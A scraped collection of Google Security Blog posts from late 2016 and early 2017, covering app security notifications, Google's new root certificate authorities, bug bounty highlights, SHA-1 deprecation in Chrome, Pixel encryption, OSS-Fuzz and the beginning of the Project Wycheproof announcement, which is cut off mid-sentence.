{"website": "Google-Security", "title": "\nApp Security Improvements: Looking back at 2016\n", "author": [], "link": "https://security.googleblog.com/2017/01/app-security-improvements-looking-back.html", "abstract": "                                  Posted by Rahul Mishra, Android Security Program Manager    [Cross-posted from the  Android Developers Blog ]    In April 2016, the Android Security team described how the Google Play App Security Improvement (ASI) program has helped developers  fix security issues in 100,000 applications . Since then, we have detected and notified developers of 11 new security issues and provided developers with resources and guidance to update their apps. Because of this, over 90,000 developers have updated over 275,000 apps!         ASI now notifies developers of 26 potential security issues. To make this process more transparent, we introduced  a new page  where developers can find information about all these security issues in one place. This page includes links to help center articles containing instructions and additional support contacts. Developers can use this page as a resource to learn about new issues and keep track of all past issues.     Developers can also refer to our  security best practices documents  and  security checklist , which are aimed at improving the understanding of general security concepts and providing examples that can help tackle app-specific issues.      How you can help:    For feedback or questions, please reach out to us through the  Google PlayDeveloper Help Center .  &#8230;  security+asi@android.com .                                         Posted by Rahul Mishra, Android Security Program Manager  [Cross-posted from the Android Developers Blog]  In April 2016, the Android Security team described how the Google Play App Security Improvement (ASI) program has helped developers fix security issues in 100,000 applications. Since then, we have detected and notified developers of 11 new security issues and provided developers with resources and guidance to update their apps. Because of this, over 90,000 developers have updated over 275,000 apps!   ASI now notifies developers of 26 potential security issues. To make this process more transparent, we introduced a new page where developers can find information about all these security issues in one place. This page includes links to help center articles containing instructions and additional support contacts. Developers can use this page as a resource to learn about new issues and keep track of all past issues.   Developers can also refer to our security best practices documents and security checklist, which are aimed at improving the understanding of general security concepts and providing examples that can help tackle app-specific issues.   How you can help:  For feedback or questions, please reach out to us through the Google PlayDeveloper Help Center. … security+asi@android.com.      ", "date": "January 19, 2017"},
{"website": "Google-Security", "title": "\nThe foundation of a more secure web\n", "author": ["Posted by Ryan Hurst, Security and Privacy Engineering"], "link": "https://security.googleblog.com/2017/01/the-foundation-of-more-secure-web.html", "abstract": "                             Posted by Ryan Hurst, Security and Privacy Engineering   In support of our work to implement HTTPS across all of our products ( https://www.google.com/transparencyreport/https/ ) we have been operating our own subordinate Certificate Authority (GIAG2), issued by a third-party. This has been a key element enabling us to more rapidly handle the SSL/TLS certificate needs of Google products.    As we look forward to the evolution of both the web and our own products it is clear HTTPS will continue to be a foundational technology. This is why we have made the decision to expand our current Certificate Authority efforts to include the operation of our own Root Certificate Authority. To this end, we have established Google Trust Services ( https://pki.goog /), the entity we will rely on to operate these Certificate Authorities on behalf of Google and Alphabet.    The process of embedding Root Certificates into products and waiting for the associated versions of those products to be broadly deployed can take time. For this reason we have also purchased two existing Root Certificate Authorities, GlobalSign R2 and R4. These Root Certificates will enable us to begin independent certificate issuance sooner rather than later.    We intend to continue the operation of our existing GIAG2 subordinate Certificate Authority. This change will enable us to begin the process of migrating to our new, independent infrastructure.    Google Trust Services now operates the following Root Certificates:    table, th, td {     border: 1px solid black; }                     Public Key       Fingerprint (SHA1)        Valid Until             GTS Root R1        RSA 4096, SHA-384       e1:c9:50:e6:ef:22:f8:4c:56:45:72:8b:92:20:60:d7:d5:a7:a3:e8       Jun 22, 2036             GTS Root R2       RSA 4096, SHA-384       d2:73:96:2a:2a:5e:39:9f:73:3f:e1:c7:1e:64:3f:03:38:34:fc:4d       Jun 22, 2036             GTS Root R3       ECC 384, SHA-384       30:d4:24:6f:07:ff:db:91:89:8a:0b:e9:49:66:11:eb:8c:5e:46:e5       Jun 22, 2036             GTS Root R4       ECC 384, SHA-384       2a:1d:60:27:d9:4a:b1:0a:1c:4d:91:5c:cd:33:a0:cb:3e:2d:54:cb       Jun 22, 2036             GS Root R2       RSA 2048, SHA-1       75:e0:ab:b6:13:85:12:27:1c:04:f8:5f:dd:de:38:e4:b7:24:2e:fe       Dec 15, 2021             GS Root R4       ECC 256, SHA-256       69:69:56:2e:40:80:f4:24:a1:e7:19:9f:14:ba:f3:ee:58:ab:6a:bb       Jan 19, 2038           Due to timing issues involved in establishing an independently trusted Root Certificate Authority, we have also secured the option to cross sign our CAs using:                      Public Key       Fingerprint (SHA1)        Valid Until             GS Root R3       RSA 2048, SHA-256       d6:9b:56:11:48:f0:1c:77:c5:45:78:c1:09:26:df:5b:85:69:76:ad       Mar 18, 2029             GeoTrust       RSA 2048, SHA-1       de:28:f4:a4:ff:e5:b9:2f:a3:c5:03:d1:a3:49:a7:f9:96:2a:82:12       May 21, 2022            If you are building products that intend to connect to a Google property moving forward you need to at minimum include the above Root Certificates. With that said even though we now operate our own roots, we may still choose to operate subordinate CAs under third-party operated roots.          For this reason if you are developing code intended to connect to a Google property, we still recommend you include a wide set of trustworthy roots. Google maintains a sample PEM file at ( https://pki.goog/roots.pem ) which is periodically updated to include the Google Trust Services owned and operated roots as well as other roots that may be necessary now, or in the future to communicate with and use Google Products and Services.                                    Posted by Ryan Hurst, Security and Privacy Engineering In support of our work to implement HTTPS across all of our products (https://www.google.com/transparencyreport/https/) we have been operating our own subordinate Certificate Authority (GIAG2), issued by a third-party. This has been a key element enabling us to more rapidly handle the SSL/TLS certificate needs of Google products.  As we look forward to the evolution of both the web and our own products it is clear HTTPS will continue to be a foundational technology. This is why we have made the decision to expand our current Certificate Authority efforts to include the operation of our own Root Certificate Authority. To this end, we have established Google Trust Services (https://pki.goog/), the entity we will rely on to operate these Certificate Authorities on behalf of Google and Alphabet.  The process of embedding Root Certificates into products and waiting for the associated versions of those products to be broadly deployed can take time. For this reason we have also purchased two existing Root Certificate Authorities, GlobalSign R2 and R4. These Root Certificates will enable us to begin independent certificate issuance sooner rather than later.  We intend to continue the operation of our existing GIAG2 subordinate Certificate Authority. This change will enable us to begin the process of migrating to our new, independent infrastructure.  Google Trust Services now operates the following Root Certificates:  table, th, td {     border: 1px solid black; }             Public Key     Fingerprint (SHA1)      Valid Until         GTS Root R1      RSA 4096, SHA-384     e1:c9:50:e6:ef:22:f8:4c:56:45:72:8b:92:20:60:d7:d5:a7:a3:e8     Jun 22, 2036         GTS Root R2     RSA 4096, SHA-384     d2:73:96:2a:2a:5e:39:9f:73:3f:e1:c7:1e:64:3f:03:38:34:fc:4d     Jun 22, 2036         GTS Root R3     ECC 384, SHA-384     30:d4:24:6f:07:ff:db:91:89:8a:0b:e9:49:66:11:eb:8c:5e:46:e5     Jun 22, 2036         GTS Root R4     ECC 384, SHA-384     2a:1d:60:27:d9:4a:b1:0a:1c:4d:91:5c:cd:33:a0:cb:3e:2d:54:cb     Jun 22, 2036         GS Root R2     RSA 2048, SHA-1     75:e0:ab:b6:13:85:12:27:1c:04:f8:5f:dd:de:38:e4:b7:24:2e:fe     Dec 15, 2021         GS Root R4     ECC 256, SHA-256     69:69:56:2e:40:80:f4:24:a1:e7:19:9f:14:ba:f3:ee:58:ab:6a:bb     Jan 19, 2038     Due to timing issues involved in establishing an independently trusted Root Certificate Authority, we have also secured the option to cross sign our CAs using:             Public Key     Fingerprint (SHA1)      Valid Until         GS Root R3     RSA 2048, SHA-256     d6:9b:56:11:48:f0:1c:77:c5:45:78:c1:09:26:df:5b:85:69:76:ad     Mar 18, 2029         GeoTrust     RSA 2048, SHA-1     de:28:f4:a4:ff:e5:b9:2f:a3:c5:03:d1:a3:49:a7:f9:96:2a:82:12     May 21, 2022     If you are building products that intend to connect to a Google property moving forward you need to at minimum include the above Root Certificates. With that said even though we now operate our own roots, we may still choose to operate subordinate CAs under third-party operated roots.  For this reason if you are developing code intended to connect to a Google property, we still recommend you include a wide set of trustworthy roots. Google maintains a sample PEM file at (https://pki.goog/roots.pem) which is periodically updated to include the Google Trust Services owned and operated roots as well as other roots that may be necessary now, or in the future to communicate with and use Google Products and Services.     ", "date": "January 26, 2017"},
{"website": "Google-Security", "title": "\nVulnerability Rewards Program: 2016 Year in Review\n", "author": ["Posted by Eduardo Vela Nava, VRP Technical Lead, Master of Disaster"], "link": "https://security.googleblog.com/2017/01/vulnerability-rewards-program-2016-year.html", "abstract": "                             Posted by Eduardo Vela Nava, VRP Technical Lead, Master of Disaster     We created our Vulnerability Rewards Program in 2010 because researchers should be rewarded for protecting our users. Their discoveries help keep our users, and the internet at large, as safe as possible.    The amounts we award vary, but our message to researchers does not; each one represents a sincere &#8216;thank you&#8217;.    As we have for  2014  and  2015 , we&#8217;re again sharing a yearly wrap-up of the Vulnerability Rewards Program.                   What was new?            In short &#8212; a lot. Here&#8217;s a quick rundown:         Previously by-invitation only, we opened up  Chrome's Fuzzer Program  to submissions from the public. The program allows researchers to run  fuzzers  at large scale, across thousands of cores on Google hardware, and receive reward payments automatically.              On the product side, we saw amazing contributions from Android researchers all over the world, less than a year after Android launched its VRP. We also expanded our overall VRP to include more products, including OnHub and Nest devices.              We increased our presence at events around the world, like  pwn2own  and  Pwnfest . The vulnerabilities responsibly disclosed at these events enabled us to quickly provide fixes to the ecosystem and keep customers safe. At both events, we were able to close down a vulnerability in Chrome within days of being notified of the issue.               Stories that stood out            As always, there was no shortage of inspiring, funny, and quirky anecdotes from the 2016 year in VRP.         We met Jasminder Pal Singh at Nullcon in India. Jasminder is a long-time contributor to the VRP, but this research is a side project for him. He spends most of his time growing  Jasminder Web Services Point , the startup he operates with six other colleagues and friends. The team consists of: two web developers, one graphic designer, a developer for Android and iOS respectively, one Linux administrator, and a Content Manager/Writer. Jasminder&#8217;s VRP rewards fund the startup. The number of reports we receive from researchers in India is growing, and we&#8217;re growing the VRP&#8217;s presence there with additional conference sponsorships, trainings, and more.               Jasminder (back right) and his team         Jon Sawyer worked with his colleague Sean Beaupre from Streamlined Mobile Solutions, and friend Ben Actis to submit three Android vulnerability reports. A resident of  Clallam County, Washington , Jon donated their $8,000 reward to their local Special Olympics team, the Orcas. Jon told us the reward was particularly meaningful because his son, Benji, plays on the team. He said:  &#8220;Special Olympics provides a sense of community, accomplishment, and free health services at meets. They do incredible things for these people, at no cost for the athletes or their parents. Our donation is going to supply them with new properly fitting uniforms, new equipment, cover some facility rental fees (bowling alley, gym, track, swimming pool) and most importantly help cover the biggest cost, transportation.&#8221;                 VRP researchers sometimes attach videos that demonstrate the bug. While making a great proof-of-concept video is a skill in itself, our researchers raised it to another level this year. Check out this video Frans Rosén sent us. It&#8217;s perfectly synchronized to the background music! We hope this trend continues in 2017 ;-)                 Researchers&#8217; individual contributions, and our relationship with the community, have never been more important. A hearty thank you to everyone that contributed to the VRP in 2016 &#8212; we&#8217;re excited to work with you (and others!) in 2017 and beyond.&nbsp;           *Josh Armour ( VRP Program Manager ), Andrew Whalley ( Chrome VRP ), and Quan To ( Android VRP ) contributed mightily to help lead these Google-wide efforts.                                       Posted by Eduardo Vela Nava, VRP Technical Lead, Master of Disaster  We created our Vulnerability Rewards Program in 2010 because researchers should be rewarded for protecting our users. Their discoveries help keep our users, and the internet at large, as safe as possible.  The amounts we award vary, but our message to researchers does not; each one represents a sincere ‘thank you’.  As we have for 2014 and 2015, we’re again sharing a yearly wrap-up of the Vulnerability Rewards Program.       What was new?    In short — a lot. Here’s a quick rundown:    Previously by-invitation only, we opened up Chrome's Fuzzer Program to submissions from the public. The program allows researchers to run fuzzers at large scale, across thousands of cores on Google hardware, and receive reward payments automatically.      On the product side, we saw amazing contributions from Android researchers all over the world, less than a year after Android launched its VRP. We also expanded our overall VRP to include more products, including OnHub and Nest devices.      We increased our presence at events around the world, like pwn2own and Pwnfest. The vulnerabilities responsibly disclosed at these events enabled us to quickly provide fixes to the ecosystem and keep customers safe. At both events, we were able to close down a vulnerability in Chrome within days of being notified of the issue.      Stories that stood out    As always, there was no shortage of inspiring, funny, and quirky anecdotes from the 2016 year in VRP.    We met Jasminder Pal Singh at Nullcon in India. Jasminder is a long-time contributor to the VRP, but this research is a side project for him. He spends most of his time growing Jasminder Web Services Point, the startup he operates with six other colleagues and friends. The team consists of: two web developers, one graphic designer, a developer for Android and iOS respectively, one Linux administrator, and a Content Manager/Writer. Jasminder’s VRP rewards fund the startup. The number of reports we receive from researchers in India is growing, and we’re growing the VRP’s presence there with additional conference sponsorships, trainings, and more.      Jasminder (back right) and his team    Jon Sawyer worked with his colleague Sean Beaupre from Streamlined Mobile Solutions, and friend Ben Actis to submit three Android vulnerability reports. A resident of Clallam County, Washington, Jon donated their $8,000 reward to their local Special Olympics team, the Orcas. Jon told us the reward was particularly meaningful because his son, Benji, plays on the team. He said: “Special Olympics provides a sense of community, accomplishment, and free health services at meets. They do incredible things for these people, at no cost for the athletes or their parents. Our donation is going to supply them with new properly fitting uniforms, new equipment, cover some facility rental fees (bowling alley, gym, track, swimming pool) and most importantly help cover the biggest cost, transportation.”      VRP researchers sometimes attach videos that demonstrate the bug. While making a great proof-of-concept video is a skill in itself, our researchers raised it to another level this year. Check out this video Frans Rosén sent us. It’s perfectly synchronized to the background music! We hope this trend continues in 2017 ;-)       Researchers’ individual contributions, and our relationship with the community, have never been more important. A hearty thank you to everyone that contributed to the VRP in 2016 — we’re excited to work with you (and others!) in 2017 and beyond.     *Josh Armour (VRP Program Manager), Andrew Whalley (Chrome VRP), and Quan To (Android VRP) contributed mightily to help lead these Google-wide efforts.      ", "date": "January 30, 2017"},
{"website": "Google-Security", "title": "\nSHA-1 Certificates in Chrome\n", "author": ["Posted by Andrew Whalley, Chrome Security"], "link": "https://security.googleblog.com/2016/11/sha-1-certificates-in-chrome.html", "abstract": "                             Posted by Andrew Whalley, Chrome Security   We&#8217;ve previously made  several   announcements  about Google Chrome's deprecation plans for SHA-1 certificates. This post provides an update on the final removal of support.    The SHA-1 cryptographic hash algorithm first  showed signs of weakness  over eleven years ago and  recent research  points to the imminent possibility of attacks that could directly impact the integrity of the Web PKI. To protect users from such attacks, Chrome will stop trusting certificates that use the SHA-1 algorithm, and visiting a site using such a certificate will result in an interstitial warning.   Release schedule   We are planning to remove support for SHA-1 certificates in Chrome 56, which will be released to the stable channel  around the end of January 2017 . The removal will follow the  Chrome release process , moving from Dev to Beta to Stable; there won't be a date-based change in behaviour.    Website operators are urged  to check  for the use of SHA-1 certificates and immediately contact their CA for a SHA-256 based replacement if any are found.   SHA-1 use in private PKIs   Previous posts made a distinction between certificates which chain to a public CA and those which chain to a locally installed trust anchor, such as those of a private PKI within an enterprise. We recognise there might be rare cases where an enterprise wishes to make their own risk management decision to continue using SHA-1 certificates.    Starting with  Chrome 54  we provide the   EnableSha1ForLocalAnchors    policy  that allows certificates which chain to a locally installed trust anchor to be used after support has otherwise been removed from Chrome. Features which  require a secure origin , such as geolocation, will continue to work, however pages will be displayed as &#8220;neutral, lacking security&#8221;. Without this policy set, SHA-1 certificates that chain to locally installed roots will not be trusted starting with Chrome 57, which will be released to the stable channel in March 2017. Note that even without the policy set, SHA-1 client certificates will still be presented to websites requesting client authentication.    Since this policy is intended only to allow additional time to complete the migration away from SHA-1, it will eventually be removed in the first Chrome release after January 1st 2019.    As Chrome makes use of certificate validation libraries provided by the host OS when possible, this option will have no effect if the underlying cryptographic library disables support for SHA-1 certificates; at that point, they will be unconditionally blocked. We may also remove support before 2019 if there is a serious cryptographic break of SHA-1. Enterprises are encouraged to make every effort to stop using SHA-1 certificates as soon as possible and to consult with their security team before enabling the policy.                                   Posted by Andrew Whalley, Chrome Security We’ve previously made several announcements about Google Chrome's deprecation plans for SHA-1 certificates. This post provides an update on the final removal of support.  The SHA-1 cryptographic hash algorithm first showed signs of weakness over eleven years ago and recent research points to the imminent possibility of attacks that could directly impact the integrity of the Web PKI. To protect users from such attacks, Chrome will stop trusting certificates that use the SHA-1 algorithm, and visiting a site using such a certificate will result in an interstitial warning. Release schedule We are planning to remove support for SHA-1 certificates in Chrome 56, which will be released to the stable channel around the end of January 2017. The removal will follow the Chrome release process, moving from Dev to Beta to Stable; there won't be a date-based change in behaviour.  Website operators are urged to check for the use of SHA-1 certificates and immediately contact their CA for a SHA-256 based replacement if any are found. SHA-1 use in private PKIs Previous posts made a distinction between certificates which chain to a public CA and those which chain to a locally installed trust anchor, such as those of a private PKI within an enterprise. We recognise there might be rare cases where an enterprise wishes to make their own risk management decision to continue using SHA-1 certificates.  Starting with Chrome 54 we provide the EnableSha1ForLocalAnchors policy that allows certificates which chain to a locally installed trust anchor to be used after support has otherwise been removed from Chrome. Features which require a secure origin, such as geolocation, will continue to work, however pages will be displayed as “neutral, lacking security”. Without this policy set, SHA-1 certificates that chain to locally installed roots will not be trusted starting with Chrome 57, which will be released to the stable channel in March 2017. Note that even without the policy set, SHA-1 client certificates will still be presented to websites requesting client authentication.  Since this policy is intended only to allow additional time to complete the migration away from SHA-1, it will eventually be removed in the first Chrome release after January 1st 2019.  As Chrome makes use of certificate validation libraries provided by the host OS when possible, this option will have no effect if the underlying cryptographic library disables support for SHA-1 certificates; at that point, they will be unconditionally blocked. We may also remove support before 2019 if there is a serious cryptographic break of SHA-1. Enterprises are encouraged to make every effort to stop using SHA-1 certificates as soon as possible and to consult with their security team before enabling the policy.     ", "date": "November 16, 2016"},
{"website": "Google-Security", "title": "\nPixel Security: Better, Faster, Stronger\n", "author": ["Posted by Paul Crowley, Senior Software Engineer and Paul Lawrence, Senior Software Engineer"], "link": "https://security.googleblog.com/2016/11/pixel-security-better-faster-stronger.html", "abstract": "                             Posted by Paul Crowley, Senior Software Engineer and Paul Lawrence, Senior Software Engineer    [Cross-posted from the  Android Developers Blog ]     Encryption protects your data if your phone falls into someone else's hands. The new Google Pixel and Pixel XL are encrypted by default to offer strong data protection, while maintaining a great user experience with high I/O performance and long battery life. In addition to encryption, the Pixel phones debuted running the Android Nougat release, which has even more  security improvements .    This blog post covers the encryption implementation on Google Pixel devices and how it improves the user experience, performance, and security of the device.          File-Based Encryption Direct Boot experience   One of the security features introduced in Android Nougat was  file-based encryption . File-based encryption (FBE) means different files are encrypted with different keys that can be unlocked independently. FBE also separates data into device encrypted (DE) data and credential encrypted (CE) data.     Direct boot  uses file-based encryption to allow a seamless user experience when a device reboots by combining the unlock and decrypt screen. For users, this means that applications like alarm clocks, accessibility settings, and phone calls are available immediately after boot.       Enhanced with TrustZone&#174; security       Modern processors provide a means to execute code in a mode that remains secure even if the kernel is compromised. On ARM&#174;-based processors this mode is known as TrustZone. Starting in Android Nougat, all disk encryption keys are stored encrypted with keys held by TrustZone software.    This secures encrypted data in two ways:       TrustZone enforces the  Verified Boot  process. If TrustZone detects that the operating system has been modified, it won't decrypt disk encryption keys; this helps to secure device encrypted (DE) data.   TrustZone enforces a waiting period between guesses at the user credential, which gets longer after a sequence of wrong guesses. With 1624 valid four-point patterns and TrustZone's ever-growing waiting period, trying all patterns would take more than four years. This improves security for all users, especially those who have a shorter and more easily guessed pattern, PIN, or password.            Encryption on Pixel phones          Protecting different folders with different keys required a distinct approach from  full-disk encryption  (FDE). The natural choice for Linux-based systems is the industry-standard eCryptFS. However, eCryptFS didn't meet our performance requirements. Fortunately one of the eCryptFS creators, Michael Halcrow, worked with the ext4 maintainer, Ted Ts'o, to add encryption natively to ext4, and Android became the first consumer of this technology. ext4 encryption performance is similar to full-disk encryption, which is as performant as a software-only solution can be.              Additionally, Pixel phones have an inline hardware encryption engine, which gives them the ability to write encrypted data at line speed to the flash memory. To take advantage of this, we modified ext4 encryption to use this hardware by adding a key reference to the bio structure, within the ext4 driver before passing it to the block layer. (The bio structure is the basic container for block I/O in the Linux kernel.) We then modified the inline encryption block driver to pass this to the hardware. As with ext4 encryption, keys are managed by the Linux keyring. To see our implementation, take a look at the  source code  for the Pixel kernel.              While this specific implementation of file-based encryption using ext4 with inline encryption benefits Pixel users, FBE is available in AOSP and ready to use, along with the other features mentioned in this post.                                     Posted by Paul Crowley, Senior Software Engineer and Paul Lawrence, Senior Software Engineer [Cross-posted from the Android Developers Blog]  Encryption protects your data if your phone falls into someone else's hands. The new Google Pixel and Pixel XL are encrypted by default to offer strong data protection, while maintaining a great user experience with high I/O performance and long battery life. In addition to encryption, the Pixel phones debuted running the Android Nougat release, which has even more security improvements.  This blog post covers the encryption implementation on Google Pixel devices and how it improves the user experience, performance, and security of the device.   File-Based Encryption Direct Boot experience One of the security features introduced in Android Nougat was file-based encryption. File-based encryption (FBE) means different files are encrypted with different keys that can be unlocked independently. FBE also separates data into device encrypted (DE) data and credential encrypted (CE) data.  Direct boot uses file-based encryption to allow a seamless user experience when a device reboots by combining the unlock and decrypt screen. For users, this means that applications like alarm clocks, accessibility settings, and phone calls are available immediately after boot.  Enhanced with TrustZone® security  Modern processors provide a means to execute code in a mode that remains secure even if the kernel is compromised. On ARM®-based processors this mode is known as TrustZone. Starting in Android Nougat, all disk encryption keys are stored encrypted with keys held by TrustZone software.  This secures encrypted data in two ways:   TrustZone enforces the Verified Boot process. If TrustZone detects that the operating system has been modified, it won't decrypt disk encryption keys; this helps to secure device encrypted (DE) data. TrustZone enforces a waiting period between guesses at the user credential, which gets longer after a sequence of wrong guesses. With 1624 valid four-point patterns and TrustZone's ever-growing waiting period, trying all patterns would take more than four years. This improves security for all users, especially those who have a shorter and more easily guessed pattern, PIN, or password.     Encryption on Pixel phones    Protecting different folders with different keys required a distinct approach from full-disk encryption (FDE). The natural choice for Linux-based systems is the industry-standard eCryptFS. However, eCryptFS didn't meet our performance requirements. Fortunately one of the eCryptFS creators, Michael Halcrow, worked with the ext4 maintainer, Ted Ts'o, to add encryption natively to ext4, and Android became the first consumer of this technology. ext4 encryption performance is similar to full-disk encryption, which is as performant as a software-only solution can be.      Additionally, Pixel phones have an inline hardware encryption engine, which gives them the ability to write encrypted data at line speed to the flash memory. To take advantage of this, we modified ext4 encryption to use this hardware by adding a key reference to the bio structure, within the ext4 driver before passing it to the block layer. (The bio structure is the basic container for block I/O in the Linux kernel.) We then modified the inline encryption block driver to pass this to the hardware. As with ext4 encryption, keys are managed by the Linux keyring. To see our implementation, take a look at the source code for the Pixel kernel.      While this specific implementation of file-based encryption using ext4 with inline encryption benefits Pixel users, FBE is available in AOSP and ready to use, along with the other features mentioned in this post.     ", "date": "November 17, 2016"},
{"website": "Google-Security", "title": "\nAnnouncing OSS-Fuzz: Continuous Fuzzing for Open Source Software\n", "author": ["Posted by Mike Aizatsky, Kostya Serebryany (Software Engineers, Dynamic Tools); Oliver Chang, Abhishek Arya (Security Engineers, Google Chrome); and Meredith Whittaker (Open Research Lead)"], "link": "https://security.googleblog.com/2016/12/announcing-oss-fuzz-continuous-fuzzing.html", "abstract": "                             Posted by Mike Aizatsky, Kostya Serebryany (Software Engineers, Dynamic Tools); Oliver Chang, Abhishek Arya (Security Engineers, Google Chrome); and Meredith Whittaker (Open Research Lead)    [Cross-posted from the  Google Testing Blog &nbsp;and the  Google Open Source Blog ]     We are happy to announce  OSS-Fuzz , a new Beta program developed over the past years with the  Core Infrastructure Initiative  community. This program will provide continuous fuzzing for select core open source software.    Open source software is the backbone of the many apps, sites, services, and networked things that make up &#8220;the internet.&#8221; It is important that the open source foundation be stable, secure, and reliable, as cracks and weaknesses impact all who build on it.     Recent   security   stories  confirm that errors like  buffer overflow  and  use-after-free  can have serious, widespread consequences when they occur in critical open source software. These errors are not only serious, but notoriously difficult to find via routine code audits, even for experienced developers. That's where  fuzz testing  comes in. By generating random inputs to a given program, fuzzing triggers and helps uncover errors quickly and thoroughly.    In recent years, several efficient general purpose fuzzing engines have been implemented (e.g.  AFL  and  libFuzzer ), and we use them to  fuzz various components of the Chrome browser . These fuzzers, when combined with  Sanitizers , can help find security vulnerabilities (e.g. buffer overflows, use-after-free, bad casts, integer overflows, etc), stability bugs (e.g. null dereferences, memory leaks, out-of-memory, assertion failures, etc) and  sometimes  even logical bugs.    OSS-Fuzz&#8217;s goal is to make common software infrastructure more secure and stable by combining modern fuzzing techniques with scalable distributed execution. OSS-Fuzz combines various fuzzing engines (initially, libFuzzer) with Sanitizers (initially,  AddressSanitizer ) and provides a massive distributed execution environment powered by  ClusterFuzz .   Early successes       Our initial trials with OSS-Fuzz have had good results. An example is the  FreeType  library, which is used on over a  billion devices  to display text (and which might even be rendering the characters you are reading now). It is important for FreeType to be stable and secure in an age when fonts are loaded over the Internet. Werner Lemberg, one of the FreeType developers,  was  an early adopter of OSS-Fuzz. Recently the  FreeType fuzzer  found a  new heap buffer overflow  only a few hours after the source change:   ERROR: AddressSanitizer: heap-buffer-overflow on address 0x615000000ffa  READ of size 2 at 0x615000000ffa thread T0 SCARINESS: 24 (2-byte-read-heap-buffer-overflow-far-from-bounds)    #0 0x885e06 in tt_face_vary_cvtsrc/truetype/ttgxvar.c:1556:31   OSS-Fuzz automatically  notified  the maintainer, who  fixed  the bug; then OSS-Fuzz automatically  confirmed  the fix. All in one day! You can see the  full list  of fixed and disclosed bugs found by OSS-Fuzz so far.       Contributions and feedback are welcome       OSS-Fuzz has already found  150 bugs  in several widely used open source  projects  (and churns  ~4 trillion test cases  a week). With your help, we can make fuzzing a standard part of open source development, and work with the broader community of developers and security testers to ensure that bugs in critical open source applications, libraries, and APIs are discovered and fixed. We believe that this approach to automated security testing will result in real improvements to the security and stability of open source software.    OSS-Fuzz is launching in Beta right now, and will be accepting suggestions for candidate open source projects. In order for a project to be accepted to OSS-Fuzz, it needs to have a large user base and/or be critical to Global IT infrastructure, a general heuristic that we are intentionally leaving open to interpretation at this early stage. See more details and instructions on how to apply  here .    Once a project is signed up for OSS-Fuzz, it is automatically subject to the 90-day disclosure deadline for newly reported bugs in our  tracker  (see details  here ). This matches industry&#8217;s  best practices  and improves end-user security and stability by getting patches to users faster.    Help us ensure this program is truly serving the open source community and the internet which relies on this critical software, contribute and leave your feedback on  GitHub .                                   Posted by Mike Aizatsky, Kostya Serebryany (Software Engineers, Dynamic Tools); Oliver Chang, Abhishek Arya (Security Engineers, Google Chrome); and Meredith Whittaker (Open Research Lead) [Cross-posted from the Google Testing Blog and the Google Open Source Blog]  We are happy to announce OSS-Fuzz, a new Beta program developed over the past years with the Core Infrastructure Initiative community. This program will provide continuous fuzzing for select core open source software.  Open source software is the backbone of the many apps, sites, services, and networked things that make up “the internet.” It is important that the open source foundation be stable, secure, and reliable, as cracks and weaknesses impact all who build on it.  Recent security stories confirm that errors like buffer overflow and use-after-free can have serious, widespread consequences when they occur in critical open source software. These errors are not only serious, but notoriously difficult to find via routine code audits, even for experienced developers. That's where fuzz testing comes in. By generating random inputs to a given program, fuzzing triggers and helps uncover errors quickly and thoroughly.  In recent years, several efficient general purpose fuzzing engines have been implemented (e.g. AFL and libFuzzer), and we use them to fuzz various components of the Chrome browser. These fuzzers, when combined with Sanitizers, can help find security vulnerabilities (e.g. buffer overflows, use-after-free, bad casts, integer overflows, etc), stability bugs (e.g. null dereferences, memory leaks, out-of-memory, assertion failures, etc) and sometimes even logical bugs.  OSS-Fuzz’s goal is to make common software infrastructure more secure and stable by combining modern fuzzing techniques with scalable distributed execution. OSS-Fuzz combines various fuzzing engines (initially, libFuzzer) with Sanitizers (initially, AddressSanitizer) and provides a massive distributed execution environment powered by ClusterFuzz. Early successes  Our initial trials with OSS-Fuzz have had good results. An example is the FreeType library, which is used on over a billion devices to display text (and which might even be rendering the characters you are reading now). It is important for FreeType to be stable and secure in an age when fonts are loaded over the Internet. Werner Lemberg, one of the FreeType developers, was an early adopter of OSS-Fuzz. Recently the FreeType fuzzer found a new heap buffer overflow only a few hours after the source change: ERROR: AddressSanitizer: heap-buffer-overflow on address 0x615000000ffa  READ of size 2 at 0x615000000ffa thread T0 SCARINESS: 24 (2-byte-read-heap-buffer-overflow-far-from-bounds)    #0 0x885e06 in tt_face_vary_cvtsrc/truetype/ttgxvar.c:1556:31  OSS-Fuzz automatically notified the maintainer, who fixed the bug; then OSS-Fuzz automatically confirmed the fix. All in one day! You can see the full list of fixed and disclosed bugs found by OSS-Fuzz so far.  Contributions and feedback are welcome  OSS-Fuzz has already found 150 bugs in several widely used open source projects (and churns ~4 trillion test cases a week). With your help, we can make fuzzing a standard part of open source development, and work with the broader community of developers and security testers to ensure that bugs in critical open source applications, libraries, and APIs are discovered and fixed. We believe that this approach to automated security testing will result in real improvements to the security and stability of open source software.  OSS-Fuzz is launching in Beta right now, and will be accepting suggestions for candidate open source projects. In order for a project to be accepted to OSS-Fuzz, it needs to have a large user base and/or be critical to Global IT infrastructure, a general heuristic that we are intentionally leaving open to interpretation at this early stage. See more details and instructions on how to apply here.  Once a project is signed up for OSS-Fuzz, it is automatically subject to the 90-day disclosure deadline for newly reported bugs in our tracker (see details here). This matches industry’s best practices and improves end-user security and stability by getting patches to users faster.  Help us ensure this program is truly serving the open source community and the internet which relies on this critical software, contribute and leave your feedback on GitHub.     ", "date": "December 1, 2016"},
{"website": "Google-Security", "title": "\nProject Wycheproof\n", "author": ["Posted by Daniel Bleichenbacher, Security Engineer and Thai Duong, Security Engineer"], "link": "https://security.googleblog.com/2016/12/project-wycheproof.html", "abstract": "                             Posted by Daniel Bleichenbacher, Security Engineer and Thai Duong, Security Engineer   We&#8217;re excited to announce the release of  Project Wycheproof , a set of security tests that check cryptographic software libraries for known weaknesses. We&#8217;ve developed over 80 test cases which have uncovered more than  40 security bugs  (some tests or bugs are not open sourced today, as they are being fixed by vendors). For example, we found that we could recover the private key of widely-used  DSA  and  ECDHC  implementations. We also provide ready-to-use tools to check  Java Cryptography Architecture  providers such as  Bouncy Castle  and the default providers in  OpenJDK .    The main motivation for the project is to have an achievable goal. That&#8217;s why we&#8217;ve named it after the Mount Wycheproof, the  smallest mountain in the world . The smaller the mountain the easier it is to climb it!    In cryptography, subtle mistakes can have catastrophic consequences, and mistakes in open source cryptographic software libraries repeat too often and remain undiscovered for too long. Good implementation guidelines, however, are hard to come by: understanding how to implement cryptography securely requires digesting decades' worth of academic literature. We recognize that software engineers fix and prevent bugs with unit testing, and we found that many cryptographic issues can be resolved by the same means.    These observations have prompted us to develop  Project Wycheproof , a collection of unit tests that detect known weaknesses or check for expected behaviors of some cryptographic algorithm. Our cryptographers have surveyed the literature and implemented most known attacks. As a result, Project Wycheproof provides tests for most cryptographic algorithms, 